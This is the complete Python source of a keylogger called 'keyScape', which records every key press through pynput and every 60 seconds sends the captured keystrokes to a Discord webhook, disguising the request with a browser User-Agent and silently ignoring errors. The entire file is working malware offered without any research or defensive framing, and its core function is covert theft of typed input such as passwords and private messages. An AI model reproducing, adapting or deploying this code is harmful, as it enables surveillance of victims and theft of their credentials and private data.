import threading as thr
from json import dumps
from pynput.keyboard import Listener, Key
from urllib.request import Request, urlopen

discord = 'DISCORD_WEBHOOK'
timer = 60 # sends keystrokes Every X seconds

class keyScape:
        def __init__(self, discord, timer):
                self.keys = ''
                self.webhook = discord
                self.timer = timer

        def info(self):
                if len(self.keys) != 0:
                        self.send()
                        self.keys = ''
                thr.Timer(self.timer, self.info).start()

        def keyPress(self, key):
                if key == Key.space:
                        key = '[space]'
                if key == Key.enter:
                        key = '[enter]'
                if key == Key.backspace:
                        key = '[backspace/delete]'
                if key == Key.shift:
                        key = '[shift]'
                if key == Key.tab:
                        key = '[tab]'

                key = str(key).replace("'", "")
                self.keys += key

#       def onRelease(self, key):
#               if key == Key.esc:
#                       return False

        def record(self):
                self.info()
                with Listener(on_press = self.keyPress) as r:
                        r.join()

        def send(self):
                embedM = []
                message = {"fields": [{"name": "KeyLogger Log", "value": f"{self.keys}", "inline": True}]}
                embedM.append(message)
                headers = {'Content-Type': 'application/json','User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11'}
                data = {"content": "","embeds": embedM}
                try:
                        urlopen(Request(self.webhook, data=dumps(data).encode(), headers=headers))
                except Exception as e:
                        pass

if __name__=='__main__':
        keyScape(discord, timer).record()
